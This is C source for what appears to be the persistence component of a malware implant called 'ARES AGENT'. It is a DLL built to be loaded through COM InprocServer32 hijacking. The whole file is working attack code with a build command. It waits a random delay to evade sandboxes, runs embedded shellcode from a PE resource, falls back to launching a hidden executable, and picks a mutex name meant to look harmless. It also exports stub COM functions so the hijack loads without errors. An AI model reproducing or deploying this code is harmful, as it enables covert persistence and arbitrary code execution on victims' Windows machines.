/*
 * ═══════════════════════════════════════════════════════════════
 *  ARES AGENT — COM Proxy DLL Stub (v3.7 FIX-03)
 *
 *  This DLL is loaded by COM InprocServer32 hijack.
 *  When a legitimate application loads the hijacked CLSID,
 *  Windows calls our DllMain → we spawn the agent in a new thread.
 *
 *  Key properties:
 *    - Has proper DllMain with DLL_PROCESS_ATTACH
 *    - Exports DllGetClassObject, DllCanUnloadNow (COM compliance)
 *    - Agent runs in background thread (doesn't block host process)
 *    - Runs once per session (mutex guard)
 *
 *  Build: gcc -shared -o proxy.dll elevator_dll.c -lole32
 *  Builder: ares_builder.py embeds this + agent shellcode
 * ═══════════════════════════════════════════════════════════════
 */

#include <windows.h>

/* ── Forward declarations ── */
static DWORD WINAPI _agent_thread(LPVOID param);

/* ── Mutex name (per-machine, derived from volume serial) ── */
static HANDLE g_mutex = NULL;

static BOOL _check_single_instance(void) {
    /* Build unique mutex name from volume serial */
    DWORD serial = 0;
    GetVolumeInformationA("C:\\", NULL, 0, &serial, NULL, NULL, NULL, 0);
    
    char mutex_name[64];
    /* Use non-suspicious name format: Global\MSxxxxxx */
    wsprintfA(mutex_name, "Global\\MS%08X", serial ^ 0xDEADBEEF);
    
    g_mutex = CreateMutexA(NULL, TRUE, mutex_name);
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(g_mutex);
        g_mutex = NULL;
        return FALSE; /* Already running */
    }
    return TRUE; /* First instance */
}

/* ── DllMain — COM entry point ── */
BOOL WINAPI DllMain(HINSTANCE hDll, DWORD reason, LPVOID reserved)
{
    (void)reserved;
    
    switch (reason) {
    case DLL_PROCESS_ATTACH:
        DisableThreadLibraryCalls(hDll);
        
        /* Only run agent once per session */
        if (!_check_single_instance())
            break;
        
        /* Start agent in background thread.
         * Don't block DllMain — COM expects quick return.
         * Pass our DLL handle so the agent can find the embedded
         * shellcode/payload in our PE resources or .rsrc section. */
        CreateThread(NULL, 0, _agent_thread, (LPVOID)hDll, 0, NULL);
        break;
        
    case DLL_PROCESS_DETACH:
        if (g_mutex) {
            ReleaseMutex(g_mutex);
            CloseHandle(g_mutex);
        }
        break;
    }
    
    return TRUE;
}

/* ── Agent thread — loads and executes the embedded payload ── */
static DWORD WINAPI _agent_thread(LPVOID param)
{
    HMODULE hSelf = (HMODULE)param;
    
    /* Anti-sandbox: delay before execution */
    Sleep(3000 + (GetTickCount() % 5000));
    
    /* Method 1: Load agent from PE resource
     * The builder embeds the agent shellcode as RT_RCDATA resource ID 101 */
    HRSRC hRes = FindResourceA(hSelf, MAKEINTRESOURCEA(101), RT_RCDATA);
    if (hRes) {
        HGLOBAL hGlob = LoadResource(hSelf, hRes);
        if (hGlob) {
            DWORD resSize = SizeofResource(hSelf, hRes);
            BYTE* resData = (BYTE*)LockResource(hGlob);
            
            if (resData && resSize > 0) {
                /* Allocate RW, copy, change to RX, execute */
                PVOID exec = VirtualAlloc(NULL, resSize,
                    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                if (exec) {
                    memcpy(exec, resData, resSize);
                    
                    DWORD oldProt;
                    VirtualProtect(exec, resSize, PAGE_EXECUTE_READ, &oldProt);
                    
                    /* Execute shellcode */
                    typedef void (*shellcode_fn)(void);
                    ((shellcode_fn)exec)();
                    
                    /* Cleanup (if shellcode returns) */
                    VirtualFree(exec, 0, MEM_RELEASE);
                }
            }
        }
    }
    
    /* Method 2: Fallback — find agent EXE in same directory and CreateProcess
     * This is less stealthy but ensures the agent runs even if
     * resource embedding failed. */
    if (!hRes) {
        char dllPath[MAX_PATH];
        GetModuleFileNameA(hSelf, dllPath, MAX_PATH);
        
        /* Replace .dll extension with .exe */
        char* dot = strrchr(dllPath, '.');
        if (dot) {
            strcpy(dot, ".exe");
            
            STARTUPINFOA si = { sizeof(si) };
            si.dwFlags = STARTF_USESHOWWINDOW;
            si.wShowWindow = SW_HIDE;
            PROCESS_INFORMATION pi = {0};
            
            if (CreateProcessA(dllPath, NULL, NULL, NULL, FALSE,
                CREATE_NO_WINDOW | DETACHED_PROCESS, NULL, NULL, &si, &pi)) {
                CloseHandle(pi.hThread);
                CloseHandle(pi.hProcess);
            }
        }
    }
    
    return 0;
}

/* ── COM Exports — required for InprocServer32 loading ──
 * These are stub implementations that make COM happy.
 * Without them, LoadLibrary succeeds but COM class factory fails
 * and may log errors. With stubs, COM loads silently. */

__declspec(dllexport) HRESULT WINAPI DllGetClassObject(
    const GUID* rclsid, const GUID* riid, void** ppv)
{
    (void)rclsid; (void)riid;
    *ppv = NULL;
    return 0x80040111L; /* CLASS_E_CLASSNOTAVAILABLE — normal for proxy */
}

__declspec(dllexport) HRESULT WINAPI DllCanUnloadNow(void)
{
    return 1; /* S_FALSE — don't unload (agent may be running) */
}

__declspec(dllexport) HRESULT WINAPI DllRegisterServer(void)
{
    return 0; /* S_OK */
}

__declspec(dllexport) HRESULT WINAPI DllUnregisterServer(void)
{
    return 0; /* S_OK */
}
